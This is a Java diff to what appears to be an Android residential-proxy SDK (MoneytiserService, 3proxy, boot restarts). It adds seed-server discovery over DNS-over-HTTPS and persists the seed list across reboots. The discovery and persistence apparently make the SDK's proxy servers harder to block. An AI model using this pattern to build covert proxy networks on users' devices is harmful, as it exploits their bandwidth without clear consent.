@@ -25,6 +25,7 @@ import java.util.concurrent.TimeUnit;
 
 import io.hopmon.R;
 import io.hopmonsdk.data.DataStore;
+import io.hopmonsdk.seed.SeedDiscovery;
 import io.hopmonsdk.service.HttpManager;
 import io.hopmonsdk.service.MoneytiserService;
 import io.hopmonsdk.service.MoneytiserService.ProxyServiceBinder;
@@ -64,6 +65,9 @@ public class Hopmn extends BroadcastReceiver {
     private static final String DEFAULT_REG_URL  = "https://{publisher}.apis.cyberprotector.online";
     private static final String SECURE_BASE_URL  = "https://{country}-{publisher}.apis.cyberprotector.online";
     private static final String SECURE_REG_URL  = "https://{publisher}.apis.cyberprotector.online";
+
+    /** Default domain sent as the {@code domain=} query parameter in seed-mode API calls. */
+    private static final String DEFAULT_DOMAIN = "apis.cyberprotector.online";
 
     private static final String DEFAULT_CATEGORY  = "888";
     private static final String REG_ENDPOINT = String.format("/?regcc=1&pub=%s&uid=%s&cid=%s&ver=%s", PUBLISHER_PLACE_HOLDER, UID_PLACE_HOLDER, CID_PLACE_HOLDER,VER_PLACE_HOLDER);
@@ -185,6 +189,13 @@ public class Hopmn extends BroadcastReceiver {
     private boolean foreground;
     private boolean mobileForeground;
 
+    // Seed-based discovery (optional)
+    private SeedDiscovery seedDiscovery;
+    private String domain;
+
+    /** DataStore key used to persist the seed CSV across service restarts. */
+    private static final String KEY_SEED_CSV = "hopmon.seed_servers_csv";
+
     private Hopmn(Context context, Builder builder) {
         mContext = context;
         mDataStore = new DataStore(context);
@@ -225,6 +236,28 @@ public class Hopmn extends BroadcastReceiver {
         }
         else {
             mDataStore.set(context.getString(R.string.hopmon_foreground), false);
+        }
+        // --- Seed-based discovery setup ---
+        // Prefer the value passed via Builder; fall back to a previously persisted value
+        // so that the SDK self-restarts (BootupReceiver) also get seed mode.
+        String seedCsv = builder.seedServersCsv;
+        if (TextUtils.isEmpty(seedCsv)) {
+            seedCsv = mDataStore.get(KEY_SEED_CSV);
+        } else {
+            mDataStore.set(KEY_SEED_CSV, seedCsv); // persist for future restarts
+        }
+        if (!TextUtils.isEmpty(seedCsv)) {
+            List<String> fqdns = new ArrayList<>();
+            for (String f : seedCsv.split(",")) {
+                String trimmed = f.trim();
+                if (!trimmed.isEmpty()) fqdns.add(trimmed);
+            }
+            if (!fqdns.isEmpty()) {
+                seedDiscovery = new SeedDiscovery(fqdns);
+                // Use explicitly provided domain, otherwise fall back to DEFAULT_DOMAIN.
+                domain = TextUtils.isEmpty(builder.domain) ? DEFAULT_DOMAIN : builder.domain;
+                LogUtils.d("Hopmn", "Seed mode enabled, domain=%s, seeds=%s", domain, fqdns);
+            }
         }
         LocalBroadcastManager.getInstance(context).registerReceiver(this, new IntentFilter(Hopmn.class.getCanonicalName()));
     }
@@ -466,6 +499,24 @@ public class Hopmn extends BroadcastReceiver {
         return mDataStore;
     }
 
+    /** Returns {@code true} when seed-based discovery is configured. */
+    public boolean isSeedMode() {
+        return seedDiscovery != null;
+    }
+
+    /** The {@link SeedDiscovery} instance, or {@code null} when not in seed mode. */
+    public SeedDiscovery getSeedDiscovery() {
+        return seedDiscovery;
+    }
+
+    /**
+     * The domain forwarded as the {@code domain} query parameter in all
+     * IP-based API calls (e.g. {@code apis.cyberprotector.online}).
+     */
+    public String getDomain() {
+        return domain;
+    }
+
     public enum Events {
         ERROR_CATCHED,
         REGISTERED,
@@ -490,6 +541,9 @@ public class Hopmn extends BroadcastReceiver {
         private boolean secureSupport;
         private boolean foregroundService = true;
         private boolean mobileForeground;
+        // Seed-based discovery (optional)
+        private String seedServersCsv;
+        private String domain;
 
         public Builder withBaseUrl(@NonNull String baseUrl) {
             this.baseUrl = baseUrl;
@@ -539,6 +593,26 @@ public class Hopmn extends BroadcastReceiver {
             LogUtils.d("Hopmn", "withMobileForeground: %s", Boolean.toString(mobileForegroundService));
             return this;
         }
+
+        /**
+         * Optional: comma-separated list of seed server FQDNs used for
+         * dynamic API server discovery (DoH → /v1/seeds → API IPs).
+         * When omitted the SDK continues using the existing fixed-domain behaviour.
+         */
+        public Builder withSeedServersCsv(@NonNull String csv) {
+            this.seedServersCsv = csv;
+            return this;
+        }
+
+        /**
+         * Optional: explicitly set the {@code domain} query parameter sent in
+         * all IP-based API calls. If omitted, defaults to {@code DEFAULT_DOMAIN}.
+         */
+        public Builder withDomain(@NonNull String domain) {
+            this.domain = domain;
+            return this;
+        }
+
         /**
          * Default delayMillis to periodic update the 3proxy configuration file.
          * <p>Default is 5 minutes</p>
